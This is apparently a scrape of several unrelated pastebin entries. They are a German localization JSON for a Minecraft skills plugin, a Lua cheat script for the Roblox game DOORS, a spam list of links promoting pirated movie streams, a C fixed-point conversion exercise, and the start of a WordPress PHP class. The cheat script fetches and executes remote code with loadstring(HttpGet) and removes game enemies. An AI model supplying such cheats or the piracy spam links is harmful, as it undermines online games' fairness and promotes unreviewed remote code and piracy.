          ""&eRezepte Freigeschaltet"",
          ""&7- &eNetheritpfeile"",
          ""&7- &eUnheilige Pfeile""
        ],
        ""archery_perk_c1_messages"": [
          ""&e✰ &6Geladen-Schuss I &e✰"",
          ""&e+Geladen-Schuss"",
          ""&7- 30s Abklingzeit"",
          ""&7- 3 Ladungen"",
          ""&7- 1 Durchdringung"",
          ""&7- 1 Rückstoß"",
          ""&7- +50% Geschwindigkeit"",
          ""&8Aktiviere durch Umschalten-Linksklick mit"",
          ""&8einem Bogen oder Armbrust in der Hand.""
        ],
        ""archery_perk_c2_messages"": [
          ""&e✰ &6Geladen-Schuss II &e✰"",
          ""&eGeladen-Schuss"",
          ""&7- 20s Abklingzeit"",
          ""&7- 5 Ladungen"",
          ""&7- 3 Durchdringung"",
          ""&7- 2 Rückstoß"",
          ""&7- +20% Schaden"",
          ""&7- +50% Geschwindigkeit"", 
          ""&7- Ignoriert Schwerkraft"",
          ""&7- Bögen schießen mit Höchstgeschwindigkeit"",
          ""&7- Armbrüste laden sofort nach""
        ],
        ""archery_perk_stealth_messages"": [
          ""&e✰ &6Assassine &e✰"",
          ""&eGarantierter Krit im Schleichmodus"",
          ""&8Schleichmodus ist definiert als, wenn das Ziel"",
          ""&8abgewandt ist und sich nicht im Kampf befindet"",
          ""&e{archery_critdamage_add} &7Krit-Schaden"",
          ""&e+Krits verursachen Blutungen""
        ],
        ""mining_perk_1_messages"": [
          ""&e✰ &6Brüchiger Fels &e✰"",
          ""&e{mining_miningspeedbonus_add} &7Abbaugeschwindigkeit""
        ],
        ""mining_perk_2_messages"": [
          ""&e✰ &6Höhlenforschung &e✰"",
          ""&e{mining_miningdrops_add} &7Abbau-Dropp"",
          ""&e{mining_miningluck_add} &7Abbauglück"",
          ""&e{power_cookingspeedbonus_add} &7Kochgeschwindigkeit""
        ],
        ""mining_perk_a1_messages"": [
          ""&e✰ &6Demolist &e✰"",
          ""&e{mining_blastingdrops_add} &7Spreng-Abbau-Dropp"",
          ""&e{mining_tntblastradius_add} &7TNT-Kraft"",
          ""&e{mining_tntdamagereduction_add} &7TNT-Resistenz""
        ],
        ""mining_perk_a2_messages"": [
          ""&e✰ &6Erderschütterer &e✰"",
          ""&e{mining_blastingdrops_add} &7Spreng-Abbau-Dropp"",
          ""&e{mining_tntblastradius_add} &7TNT-Kraft"",
          ""&e{mining_tntdamagereduction_add} &7TNT-Resistenz"",
          ""&eRezept Freigeschaltet"",
          ""&7- &eDreifach-TNT""
        ],
        ""mining_perk_a3_messages"": [
          ""&e✰ &6Verzauberte Explosiva &e✰"",
          ""&eLege Seidenhülle oder"", 
          ""&eFortune II für dein TNT fest."",
          ""&8Überprüfe deinen Fertigkeitsbaum, um dies auszuwählen""
        ],
        ""mining_perk_a3silktouch_messages"": [
          ""&7>>> &eSeidenhülle &7ausgewählt"",
          ""&8All dein TNT bricht Blöcke nun so,"",
          ""&8als würde es mit einer Seidenhülle-Spitzhacke gebrochen"" 
        ],
        ""mining_perk_a3fortune_messages"": [
          ""&7>>> &eFortune II &7ausgewählt"",
          ""&8All dein TNT bricht Blöcke nun so,"",
          ""&8als würde es mit einer Fortune II-Spitzhacke gebrochen""
        ],
        ""mining_perk_b1_messages"": [
          ""&e✰ &6Zwergisches Geschick &e✰"",
          ""&e{mining_miningspeedbonus_add} &7Abbaugeschwindigkeit"",
          ""&e{mining_blockexperiencerate_add} &7Erfahrungspunkte/Block"",
          ""&e+Bohren"",
          ""&7- 60s Abklingzeit"",
          ""&7- 10s Dauer"",
          ""&7- +200% Abbaugeschwindigkeit"",
          ""&8Aktiviere durch Umschalten-Rechtsklick mit"",
          ""&8einer Spitzhacke in der Hand.""
        ],
        ""mining_perk_b2_messages"": [
          ""&e✰ &6Ader-Förderung &e✰"",
          ""&e{mining_miningdrops_add} &7Abbau-Dropp"",
          ""&e{mining_miningluck_add} &7Abbauglück"", 
          ""&e{power_cookingspeedbonus_add} &7Kochgeschwindigkeit"",
          ""&e+Ader-Bergbau"",
          ""&7- Nur Erze"",
          ""&8Umschalten beim Abbauen eines Blocks, um alle"",
          ""&8damit verbundenen Blöcke schnell zu ernten.""
        ],
        ""mining_perk_3_messages"": [
          ""&e✰ &6Erdteiler &e✰"",
          ""&e{mining_blockexperiencemultiplier_add} &7Block-Erfahrungspunkte"",
          ""&e{power_cookingspeedbonus_add} &7Kochgeschwindigkeit"",
          ""&eBohren"",
          ""&7- 30s Abklingzeit"",
          ""&7- &e{mining_drillingspeedbonus_add} Abbaugeschwindigkeit""
        ],
        ""mining_perk_4_messages"": [
          ""&e✰ &6Aspekt von Kali &e✰"",
          ""&e{power_cookingspeedbonus_add} &7Kochgeschwindigkeit"",
          ""&eAder-Bergbau"",
          ""&7- Die meisten Stein-Blöcke (nicht Stein)""
        ],
        ""alchemy_perk_1_messages"": [
          ""&d✰ &5Stabile Verbrennung &d✰"",
          ""&d{alchemy_brewingtimereduction_add} &7Braugeschwindigkeit""
        ],
        ""alchemy_perk_2_messages"": [
          ""&d✰ &5Potente Zutaten &d✰"",
          ""&d{alchemy_brewingingredientsavechance_add} &7Zutateneinsparungschance""
        ],
        ""alchemy_perk_a1_messages"": [
          ""&d✰ &5Flüchtige Gifte &d✰"",
          ""&d{alchemy_debuffbrewingskill_add} &7Giftqualität"",
          ""&d{alchemy_splashintensityminimum_add} &7Splash-Intensität""
        ],
        ""alchemy_perk_a2_messages"": [
          ""&d✰ &5Chemische Artillerie &d✰"",
          ""&d{alchemy_debuffbrewingskill_add} &7Giftqualität"",
          ""&d{alchemy_splashintensityminimum_add} &7Splash-Intensität"",
          ""&d{alchemy_lingeringdurationmultiplier_add} &7Nachhall-Dauer"",
          ""&d{alchemy_lingeringradiusmultiplier_add} &7Nachhall-Radius"",
          ""&d{alchemy_throwvelocity_add} &7Wurfkraft""
        ],
        ""alchemy_perk_b1_messages"": [
          ""&d✰ &5Effektive Katalysatoren &d✰"",
          ""&d{alchemy_buffbrewingskill_add} &7Beneficial Potion Qualität"",
          ""&d{alchemy_brewingtimereduction_add} &7Braugeschwindigkeit""
        ],
        ""alchemy_perk_b2_messages"": [
          ""&d✰ &5Exotische Zutaten &d✰"",
          ""&d{alchemy_buffbrewingskill_add} &7Beneficial Potion Qualität"",
          ""&d{alchemy_brewingingredientsavechance_add} &7Zutateneinsparungschance"",
          ""&dTränke-Rezepte Freigeschaltet:"",
          ""&7- Eile (Unbeholfener Trank + Netherquarz)"",
          ""&7- Gesundheitsbonus (Unbeholfener Trank + Süße Beeren)""
        ],
        ""alchemy_perk_3_messages"": [
          ""&d✰ &5Mächtige Mixturen &d✰"",
          ""&d{alchemy_brewingtimereduction_add} &7Braugeschwindigkeit"",
          ""&d+Tränke Mischen"",
          ""&7- Bis zu 3x"",
          ""&7- 20% Dauerverlust"",
          ""&8Nimm einen Trank und rechtsklicke ihn"",
          ""&8auf einen anderen Trank in deinem"",
          ""&8Inventar, um sie zu mischen.""
        ],
        ""alchemy_perk_4_messages"": [
          ""&d✰ &5Prima Materia &d✰"",
          ""&d{alchemy_genericbrewingskill_add} &7Potion Qualität"",
          ""&dTränke-Rezepte Freigeschaltet:"",
          ""&7- &#0077ffDrausch des Midas &7(Netherstar)""
        ],
        ""alchemy_perk_combo_messages"": [
          ""&d✰ &5Ätzende Gifte &d✰"",
          ""&d{lightweapons_coatingcharges_add} &7Waffenbeschichtungs-Ladungen"",
          ""&dRezepte Freigeschaltet"",
          ""&7- Leere Flasche"",
          ""&7- Flasche 'o' Gift"",
          ""&7- Flasche 'o' Schädigung"",
          ""&7- Flasche 'o' Fäulnis"",
          ""&7- Flasche 'o' Heiligkeit""
        ],
        ""smithing_perk_1_messages"": [
          ""&e✰ &6Handwerker &e✰"",
          ""&e{smithing_woodcraftingskill_add} &7Holzqualität"",
          ""&e{smithing_leathercraftingskill_add} &7Lederqualität""
        ],
        ""smithing_perk_2_messages"": [
          ""&e✰ &6Lehrlingshufschmied &e✰"",
          ""&e{smithing_stonecraftingskill_add} &7Steinqualität"",
          ""&e{smithing_chaincraftingskill_add} &7Kettenrüstungsqualität""
        ],
        ""smithing_perk_3_messages"": [
          ""&e✰ &6Hufschmied &e✰"",
          ""&e{smithing_ironcraftingskill_add} &7Eisenqualität"",
          ""&e{smithing_goldcraftingskill_add} &7Goldqualität""
        ],
        ""smithing_perk_4_messages"": [
          ""&e✰ &6Kristallschmied &e✰"",
          ""&e{smithing_diamondcraftingskill_add} &7Diamantqualität""
        ],
        ""smithing_perk_5_messages"": [
          ""&e✰ &6Höllenfeuer &e✰"",
          ""&e{smithing_netheritecraftingskill_add} &7Netheritequalität""
        ],
        ""smithing_perk_6_messages"": [
          ""&e✰ &6Durins Segen &e✰"",
          ""&e{smithing_genericcraftingskill_add} &7Universalqualität""
        ],
        ""smithing_perk_prismarine_messages"": [
          ""&e✰ &6Marine Schmiedekunst &e✰"",
          ""&eRezept Freigeschaltet"",
          ""&7- Dreizack""
        ],
        ""smithing_perk_enderic_messages"": [
          ""&e✰ &6Exotische Schmiedekunst &e✰"",
          ""&eRezepte Freigeschaltet"",
          ""&7- Elytra"",
          ""&7- Korallenledér""
        ],
        ""smithing_perk_bows_messages"": [
          ""&e✰ &6Fortgeschrittene Bogenfertigung &e✰"",
          ""&e{smithing_bowcraftingskill_add} &7Bogenqualität"",
          ""&e{smithing_crossbowcraftingskill_add} &7Armbrustqualität""
        ],
        ""woodcutting_perk_1_messages"": [
          ""&a✰ &2Anfängliches Holzfällen &a✰"",
          ""&a+10% &7Stammabbau-Geschwindigkeit"",
          ""&a+0,1 Erfahrungspunkte &7pro Block""
        ],
        ""woodcutting_perk_2_messages"": [
          ""&a✰ &2Goldene Blätter &a✰"",
          ""&a+Seltene Chance für Goldenen Apfel-"",
          ""&aDrops von Blättern."",
          ""&a+0,2 Erfahrungspunkte &7pro Block""
        ],
        ""woodcutting_perk_3_messages"": [
          ""&a✰ &2Entwaldung I &a✰"",
          ""&a+Baumfäller"",
          ""&7- Kleine Bäume (8 Blöcke)"",
          ""&7- 10s Abklingzeit"",
          ""&8Umschalten, während du den Stammbasis eines"",
          ""&8Baumes abbaust, um den gesamten Baum schnell zu ernten""
        ],
        ""woodcutting_perk_4_messages"": [
          ""&a✰ &2Baumwart &a✰"",
          ""&a+20% &7Stammabbau-Geschwindigkeit"",
          ""&a+0,5 Erfahrungspunkte &7pro Block"",
          ""&a2x &7Setzling-Wachstumsgeschwindigkeit""
        ],
        ""woodcutting_perk_5_messages"": [
          ""&a✰ &2Kristallblätter &a✰"",
          ""&a+Seltene Chance für &lKristall-Apfel-"",
          ""&aDrops von Blättern."",
          ""&aHäufigere Golden-Apfel-Drops""
        ],
        ""woodcutting_perk_carpentry_a_messages"": [
          ""&a✰ &2Zimmerei &a✰"",
          ""&a+Erhöhter Ertrag aus den meisten Holzrezepten""
        ],
        ""woodcutting_perk_capitator_a_messages"": [
          ""&a✰ &2Entwaldung II &a✰"",
          ""&aBaumfäller"",
          ""&7- Mittlere Bäume (32 Blöcke)"",
          ""&7- 7s Abklingzeit""
        ],
        ""woodcutting_perk_capitator_b_messages"": [
          ""&a✰ &2Entwaldung III &a✰"",
          ""&aBaumfäller"",
          ""&7- Große Bäume (128 Blöcke)"",
          ""&7- 3s Abklingzeit""
        ],
        ""woodcutting_perk_combo_messages"": [
          ""&a✰ &2Aktiver Lebensstil &a✰"",
          ""&a{power_foodbonusseafood_add}&7 Lebensmittel-Nährwert"",
          ""&a{power_hungersavechance_add}&7 Verringerter Hungerverbrauch"",
          ""&a{power_healthregenerationbonus_add}&7 Gesundheitsregeneration""
        ],
        ""party-level-description-1"": [
          ""&e+5 Partei-Kapazität &7(Jetzt 10)"",
          ""&e+EP-Teilung &7(80% Effizienz)"",
          ""&8&m                                              "",
          ""&6               Zusammen stärker"",
          ""&7Erhalte passive Boni für das Umfeld von Verbündeten"",
          ""&7      (20 Blöcke Radius - Max. 5 Verbündete)"",
          ""&e              +0,1 Glück &7(Max 0,5)"",
          ""&8&m                                              ""
        ],
        ""party-level-description-2"": [
          ""&e+5 Partei-Kapazität &7(Jetzt 15)"",
          ""&eEP-Teilung &7(100% Effizienz)"",
          ""&ePartei-Umbenennung"",
          ""&8&m                                              "",
          ""&6               Zusammen stärker"",
          ""&7Erhalte passive Boni für das Umfeld von Verbündeten"",
          ""&7       (20 Blöcke Radius - Max. 5 Verbündete)"",
          ""&e       +5% Rückstoß-Resistenz &7(Max 25%)"",
          ""&8&m                                              ""
        ],
        ""party-level-description-3"": [
          ""&e+10 Partei-Kapazität &7(Jetzt 25)"",
          ""&#ff0000C&#ff3000o&#ff5f00l&#ff8f00o&#ffbf00r&#ffef00f&#bfff00u&#60ff00l &#00ff00P&#009f60a&#0040bfr&#0900eft&#2600c0y &#420092N&#5d0096a&#7900b5m&#9400d3e"",
          ""&e+Gegenstand-Teilung &7(50 Blöcke Radius)"",
          ""&8Benutze Befehl /party shareitem"",
          ""&8&m                                              "",
          ""&6               Zusammen stärker"",
          ""&7Erhalte passive Boni für das Umfeld von Verbündeten"",
          ""&7      (20 Blöcke Radius - Max. 5 Verbündete)"",
          ""&e        +2% Schadenresistenz &7(Max 10%)"",
          ""&8&m                                              ""
        ],
        ""party-level-description-4"": [
          ""&e+20 Partei-Kapazität &7(Jetzt 45)"",
          ""&e+&#ff0000C&#ff2100o&#ff4200l&#ff6300o&#ff8500r&#ffa600f&#ffc700u&#ffe900l &#e9ff00P&#a6ff00a&#64ff00r&#21ff00t&#00de21y &#009b64D&#0059a6e&#0016e9s&#0d00e9c&#2100c9r&#3400a8i&#480087p&#5b0094t&#6e00a9i&#8100beo&#9400d3n"",
          ""&eEP-Teilung &7(120% Effizienz)"",
          ""&eGegenstand-Teilung &7(150 Blöcke Radius)"",
          ""&8Benutze Befehl /party shareitem"",
          ""&8&m                                              "",
          ""&6               Zusammen stärker"",
          ""&7Erhalte passive Boni für das Umfeld von Verbündeten"",
          ""&7      (&e30&7 Blöcke Radius - Max. &e7&7 Verbündete)"",
          ""&e           +5% Grabungsgeschwindigkeit &7(Max 35%)"",
          ""&e       +4% Bewegungsgeschwindigkeit &7(Max 28%)"",
          ""&8&m                                              ""
        ],
        ""party-level-description-5"": [
          ""&e+45 Partei-Kapazität &7(Jetzt 80)"",
          ""&eGegenstand-Teilung &7(Unbegrenzte Reichweite)"",
          ""&8Benutze Befehl /party shareitem"",
          ""&8&m                                              "",
          ""&6               Zusammen stärker"",
          ""&7Erhalte passive Boni für das Umfeld von Verbündeten"",
          ""&7      (&e50&7 Blöcke Radius - Max. &e10&7 Verbündete)"",
          ""&e        +3% Verursachter Schaden &7(Max 30%)"",
          ""&e          +3% Maximale Gesundheit &7(Max 30%)"",
          ""&e       +5% Krit-Resistenz &7(Max 50%)"",
          ""&8&m                                              ""
        ],
        ""transmutation_potion_lore"": [
          ""&eEin wirbelndes Gebräu aus"",
          ""&eglitzernder Flüssigkeit."",
          ""&8Werfe es auf eine Oberfläche, um"",
          ""&8sie zu transmutieren""
        ],
        ""loot_selection_prefix"": [
          ""&8&m                              "",
          ""&7Klicke zum Auswählen, %rolls%&7 übrig."",
          ""&cRechtsklick zum Entfernen"",
          ""&8&m                              ""
        ],
        ""loot_selection_suffix"": [],
        ""death_message_bleed_enemy"": [
          ""&f%player% verblutete durch %killer%""
        ],
        ""death_message_bleed"": [
          ""&f%player% verblutet""
        ],
        ""death_message_radiant_enemy"": [
          ""&f%player% wurde von %killer% exorziert""
        ],
        ""death_message_radiant"": [
          ""&f%player% wurde exorziert""
        ],
        ""death_message_necrotic_enemy"": [
          ""&f%player% zerfiel durch %killer%""
        ],
        ""death_message_necrotic"": [
          ""&f%player% zerfiel""
        ],
        ""death_message_bludgeoning_enemy"": [
          ""&f%player% wurde von %killer% zu Tode geprügelt""
        ],
        ""death_message_bludgeoning"": [
          ""&f%player% wurde zu Tode geprügelt""
        ],
        ""skilltree_icon_format"": [
          ""&7Level: &e%level_current%"",
          ""&7EP: &e%exp_current%&7/&e%exp_next%"",
          ""&7Gesamt-EP: &e%exp_total%"",
          ""&7Fertigkeitspunkte: &e%skillpoints%"",
          ""&7Prestigepunkte: &e%prestigepoints%""
        ],
        ""skilltree_perk_format"": [
          ""%description%"",
          ""&8&m                               "",
          ""&7Erfordert %skill% &7LV&e%level_required%"",
          ""&7%other_levels_required%"",
          ""%cost%"",
          ""&8&m                               "",
          ""%requireperk_one%"",
          ""%requireperk_all%"",
          ""%warning_levels%"",
          ""%warning_other_levels%"",
          ""%warning_all_perks%"",
          ""%warning_version%"",
          ""%warning_one_perks%"",
          ""%warning_cost%"",
          ""%status_unlockable%"",
          ""%status_unlocked%""
        ],
        ""immersive_recipe_button_format"": [
          ""&7Zeit: &e%crafting_time%s"",
          ""&eZutaten:"",
          ""%ingredients%"",
          ""&8&m                                   "",
          ""%modifiers%"",
          ""&8&m                                   "",
          ""&eUmschalten-Klicken, um das Rezept zu (ent)favorisieren""
        ],
        ""command_help_format"": [
          ""&8&m                              "",
          ""&7Befehl: &e%command%"",
          ""&7Beschreibung: &e%description%"",
          ""&7Berechtigung: &e%permissions%""
        ],
        ""party-info-format"": [
          ""&8[%level% &a%name%&8]"",
          ""&a%exp%&7/&a%exp_next%EP"",
          ""&aDescription&7: %description%"",
          """",
          ""&aPartei offen&7: &a%status_open%"",
          ""&aEP-Teilung&7: &a%status_exp_sharing%"",
          ""&aGegenstand-Teilung&7: &a%status_item_sharing%"",
          """",
          ""&aDein Rang&7: &a%rank%"",
          """",
          ""&7Mitglieder (&a%member_count%&7/&a%member_cap%&7)"",
          ""&a%member_list%""
        ],
        ""skill-level-up-power"": [
          ""TITLE(&7Du hast Level &e%level%&7 erreicht;Schau in &e/skills &7, um verfügbare Perks zu sehen;40;5)""
        ],
        ""skill-level-up-smithing"": [
          ""TITLE(&r;&eSchmieden&7 hat Level &e%level%&7 erreicht)"",
          ""&eSchmieden&7 hat Level &e%level%&7 erreicht""
        ],
        ""skill-level-up-mining"": [
          ""TITLE(&r;&cAbbauen&7 hat Level &c%level%&7 erreicht)"",
          ""&cAbbauen&7 hat Level &c%level%&7 erreicht""
        ],
        ""skill-level-up-light-weapons"": [
          ""TITLE(&r;&eLeichte Waffen&7 haben Level &e%level%&7 erreicht)"",
          ""&eLeichte Waffen&7 haben Level &e%level%&7 erreicht""
        ],
        ""skill-level-up-light-armor"": [
          ""TITLE(&r;&eLeichte Rüstung&7 hat Level &e%level%&7 erreicht)"",
          ""&eLeichte Rüstung&7 hat Level &e%level%&7 erreicht""
        ],
        ""skill-level-up-woodcutting"": [
          ""TITLE(&r;&aHolzfällen&7 hat Level &a%level%&7 erreicht)"",
          ""&aHolzfällen&7 hat Level &a%level%&7 erreicht""
        ],
        ""skill-level-up-digging"": [
          ""TITLE(&r;&aGraben&7 hat Level &a%level%&7 erreicht)"",
          ""&aGraben&7 hat Level &a%level%&7 erreicht""
        ],
        ""skill-level-up-heavy-weapons"": [
          ""TITLE(&r;&cSchwere Waffen&7 haben Level &c%level%&7 erreicht)"",
          ""&cSchwere Waffen&7 haben Level &c%level%&7 erreicht""
        ],
        ""skill-level-up-heavy-armor"": [
          ""TITLE(&r;&cSchwere Rüstung&7 hat Level &c%level%&7 erreicht)"",
          ""&cSchwere Rüstung&7 hat Level &c%level%&7 erreicht""
        ],
        ""skill-level-up-farming"": [
          ""TITLE(&r;&aFarming&7 hat Level &a%level%&7 erreicht)"",
          ""&aFarming&7 hat Level &a%level%&7 erreicht""
        ],
        ""skill-level-up-fishing"": [
          ""TITLE(&r;&bAngeln&7 hat Level &b%level%&7 erreicht)"",
          ""&bAngeln&7 hat Level &b%level%&7 erreicht""
        ],
        ""skill-level-up-enchanting"": [
          ""TITLE(&r;&bVerzaubern&7 hat Level &b%level%&7 erreicht)"",
          ""&bVerzaubern&7 hat Level &b%level%&7 erreicht""
        ],
        ""skill-level-up-archery"": [
          ""TITLE(&r;&eBogenschießen&7 hat Level &e%level%&7 erreicht)"",
          ""&eBogenschießen&7 hat Level &e%level%&7 erreicht""
        ],
        ""skill-level-up-alchemy"": [
          ""TITLE(&r;&dAlchemie&7 hat Level &d%level%&7 erreicht)"",
          ""&dAlchemie&7 hat Level &d%level%&7 erreicht""
        ],
        ""default_recipe_description_cooking"": [
          ""&e%input% &ezu %result% kochen""
        ],
        ""default_recipe_description_grid"": [
          ""%ingredients%"",
          ""&e="",
          ""&f%result%""
        ],
        ""default_recipe_description_smithing"": [
          ""&f%base% &e+ %addition% &e= &f%result%""
        ],
        ""default_recipe_description_brewing"": [
          ""&e%ingredient% &egebraut zu &e%applyon%"",
          ""&eErgibt %result%""
        ],
        ""default_recipe_description_immersive"": [
          ""%ingredients%"",
          """",
          ""&eErgibt %result%""
        ],
        ""default_recipe_description_immersive_tinker"": [
          ""&eHalte %input% &emit"",
          ""%ingredients%"",
          """",
          ""&eErgibt %result%""
        ],
        ""default_recipe_description_cauldron_catalyst"": [
          ""%ingredients%"",
          ""&eEinfügen von %catalyst%"",
          """",
          ""&eErgibt %result%""
        ],
        ""default_recipe_description_cauldron"": [
          ""%ingredients%"",
          """",
          ""&eErgibt %result%""
        ]
      },
      ""stringIndex"": {},
      ""stringListIndex"": {}
    }"
H4UCWtc3,DOORS F4 SCRIPT,PieGG,Lua,Saturday 4th of May 2024 11:20:49 AM CDT,"local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = ""F4Exploits [Doors]"", HidePremium = false, SaveConfig = true, ConfigFolder = ""f4doors""})

OrionLib:MakeNotification({
	Name = ""F4Exploits"",
	Content = ""Executed f4xdoors"",
	Image = ""rbxassetid://4483345998"",
	Time = 5
})

local Tab = Window:MakeTab({
	Name = ""Entities"",
	Icon = ""rbxassetid://4483345998"",
	PremiumOnly = false
})

local Tab3 = Window:MakeTab({
	Name = ""Misc"",
	Icon = ""rbxassetid://4483345998"",
	PremiumOnly = false
})

Tab3:AddButton({
	Name = ""Fullbright"",
	Callback = function()
      	for i,v in next, game.Lighting:GetChildren() do
           v:Destroy()
        end
game.Lighting.ClockTime = 12
game.Workspace.Camera.SkyboxPart:Remove()
  	end    
})

Tab3:AddButton({
	Name = ""Speed 20"",
	Callback = function()
        game[""Run Service""].RenderStepped:Connect(function()
      	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 20
        end)
  	end    
})

Tab3:AddButton({
	Name = ""No Footsteps"",
	Callback = function()
      	game.ReplicatedStorage.Footsteps:Remove()
        game.ReplicatedStorage.RemotesFolder.Footstep:Remove()
  	end    
})

Tab3:AddButton({
	Name = ""No Jumpscare (WIP)"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.Jumpscare:Remove()
  	end    
})

Tab3:AddButton({
	Name = ""No Entity Models (WIP)"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.Jumpscare:Remove()
  	end    
})

Tab:AddButton({
	Name = ""No Screech"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.Screech:Remove()
  	end    
})

Tab:AddButton({
	Name = ""No Greed"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.Greed:Remove()
  	end    
})

Tab:AddButton({
	Name = ""No Haste"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.Haste:Remove()
  	end    
})

Tab:AddButton({
	Name = ""No A-90"",
	Callback = function()
      	game.ReplicatedStorage.EntityInfo.A90:Remove()
  	end    
})

Tab:AddButton({
	Name = ""No Dread"",
	Callback = function()
      	game.ReplicatedStorage.RemotesFolder.Dread:Remove()
  	end    
})

Tab3:AddButton({
	Name = ""Noclip (WIP)"",
	Callback = function()
      	game[""Run Service""].RenderStepped:Connect(function()
game.Players.LocalPlayer.Character.Collision.Size = Vector3.new(0.01,0.01,0.01)
game.Players.LocalPlayer.Character.Collision.CanCollide = false
end)
  	end    
})

game.Workspace.ChildAdded:Connect(function(child)
   OrionLib:MakeNotification({
	Name = ""F4Exploits"",
	Content = ""Entity Spawned ["" .. child.Name .. ""]"",
	Image = ""rbxassetid://4483345998"",
	Time = 5
})
end)"
dS8Q6kQ9,dsfgsegseg,gadungw71,PHP,Saturday 4th of May 2024 11:03:12 AM CDT,"•	https://www.imdb.com/list/ls545709974
•	https://www.imdb.com/list/ls545709879/
•	https://www.imdb.com/list/ls545708603/
•	https://www.imdb.com/list/ls545708681/
•	https://www.imdb.com/list/ls545750099/
•	https://www.artstation.com/artwork/obLGRL
•	https://www.artstation.com/phimvayhamketrungphat20246/profile
•	https://www.artstation.com/artwork/g0rNNP
•	https://www.artstation.com/vayham4fullhdvietsub3/profile
•	https://bento.me/phim-vay-ham-ke-trung-phat-vietsub
•	https://bento.me/phim-vay-ham-ke-trung-phat-2024-hd
•	https://www.kooapp.com/koo/guest_3NFOM8/7c3ff70d-6951-42d1-88eb-a5f92e078d22
•	https://open.firstory.me/user/clvs8lvvx000m01t6hkzhb2fk
•	https://open.firstory.me/story/clvs8ng2d125o01yeem4k9ltl
•	https://wandering.flarum.cloud/d/59433-engkautiada
•	https://hiuderyy.hashnode.dev/sghbtftnguymu
•	https://www.bankier.pl/forum/temat_angan-anganku,66157423.html.
•	https://medium.com/@rarawwwuu24/%EB%B2%94%EC%A3%84%EB%8F%84%EC%8B%9C-4-%EC%98%81%ED%99%94-%EC%A0%84%EC%B2%B4-%EC%98%81%ED%99%94-korean-%EC%A0%84%EC%B2%B4-%EB%B2%84%EC%A0%84-hd-%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C-2024-e45fac813b5d
•	https://www.onfeetnation.com/profiles/blogs/sukadandukakitajalani
•	https://forum.mush.com.br/topic/214334/xem-phim-v%C3%A2y-h%C3%A3m-4-k%E1%BA%BB-tr%E1%BB%ABng-ph%E1%BA%A1t-mi%E1%BB%85n-ph%C3%AD-online
•	https://hackmd.io/@rerewilli6/HJmBwAmM0
•	https://demo.hedgedoc.org/s/Q_NXPMhNX
•	https://rentry.co/85e3nfau
•	https://paste.ee/p/OOy7l
•	https://yamcode.com/sdfsedg-90
•	https://lifeisfeudal.com/Discussions/question/%EB%B2%94%EC%A3%84%EB%8F%84%EC%8B%9C-4-the-roundup-punishment-%EC%98%81%ED%99%94-%EC%98%A8%EB%9D%BC%EC%9D%B8-1080p
•	https://start.me/w/yOJrKm
•	https://plaza.rakuten.co.jp/aryasantosso/diary/202405050000/
•	https://telegra.ph/XCVXD-05-04
•	https://muckrack.com/rumit-runyem/bio
•	https://profile.hatena.ne.jp/gordon212/
•	https://www.bitsdujour.com/profiles/SS1TXO
•	http://aldenfamilydentistry.com/UserProfile/tabid/57/userId/745216/Default.aspx
•	https://www.fitlynk.com/1714838508F260157
"
fZiyVWJN,MC_IT_prevod_na_Q_cisla,majkl36,C,Saturday 4th of May 2024 11:00:44 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <math.h>

//vytvorenie aliasu pre datovy typ
typedef uint16_t UQ_t;
// saturovanie do maximalnej hodnoty 16-bitoveho Q cisla pri presiahnuti rozsahu Q cisla
UQ_t saturate(uint32_t x)
{
    if (x > 65535)
        return 65535;
    else
        return (uint16_t)x;
}
//prevod cisla s plavajucou desatinnou ciarkou na Q cislo
UQ_t float2Q (double realne, int n)
{
    UQ_t result = saturate((uint32_t)round(realne*(pow(2,n))));
    return result;
}
//prevod Q cisla na cislo s plavajucou desatinnou ciarkou
double Q2float (UQ_t q, int n)
{
    double result = q/(pow(2,n));
    return result;
}

//nasobenie dvoch Q cisel
UQ_t multQ(UQ_t a, UQ_t b,int n)
{
    UQ_t result;
    uint32_t temp;

    temp = (uint32_t)a * (uint32_t)b;
    result = saturate(temp >> n);

    return result;
}
//vypocet chyby nasobenia
double multQ_Err(UQ_t inQ, double inDouble, int n)
{
    return fabs((Q2float(inQ,n))-inDouble);
}
//telo programu
int main()
{
    int m,n;
    double inA[10];
    double inB[10];

    double errVal[10] = {0};
    UQ_t Qresult[10] = {0};
    double Fresult[10] = {0};
    double errSum = 0;
    double errAvg = 0;

    scanf(""%d %d"",&m,&n);

    double resolution = pow(2,(-n));
    for (int i=0; i<10; i++)
    {
        scanf (""%lf %lf"", &inA[i],&inB[i]);

        Qresult[i] = multQ(float2Q(inA[i],n),
                           float2Q(inB[i],n),
                           n);
        Fresult[i] = (inA[i]*inB[i]);

        errVal[i] = multQ_Err(Qresult[i],Fresult[i],n);

        errSum += errVal[i];

        errAvg = errSum/(i+1);
    }
    printf(""Priemerna chyba prevodu a nasobenia je %.*lf, co je "",n,errAvg);
    if (errAvg > resolution)
    {
        printf(""viac ako rozlisenie prevodu %.*lf."",n,resolution);
        return 0;
    }
    printf(""menej ako rozlisenie prevodu %.*lf."",n,resolution);
    return 0;
}
"
mgRJKD2d,Untitled,geminilabs,PHP,Saturday 4th of May 2024 10:39:12 AM CDT,"class Glsr_Fix_Assigned_Posts
{
    protected int $current;
    protected int $fixed;
    protected int $limit;

    public function __construct()
    {
        $this->current = 0;
        $this->fixed = 0;
        $this->limit = 100;
    }

    public function run()
    {
        if (!function_exists('glsr')) {
            return;
        }
        wp_raise_memory_limit('admin');
        glsr('Database')->beginTransaction('assigned_posts');
        while (true) {
            $results = $this->unassigned();
            if (empty($results)) {
                break;
            }
            $values = $this->prepareValues($results);
            if (!empty($values)) {
                glsr('Database')->insertBulk('assigned_posts', $values, [
                    'rating_id',
                    'post_id',
                    'is_published',
                ]);
                $this->fixed += count($values);
            }
        }
        glsr('Database')->finishTransaction('assigned_posts');
        glsr_log()->info(""{$this->fixed} review assignments fixed!"");
    }

    public function prepareValues(array $results): array
    {
        $values = [];
        foreach ($results as &$result) {
            $submitted = maybe_unserialize($result['submitted']);
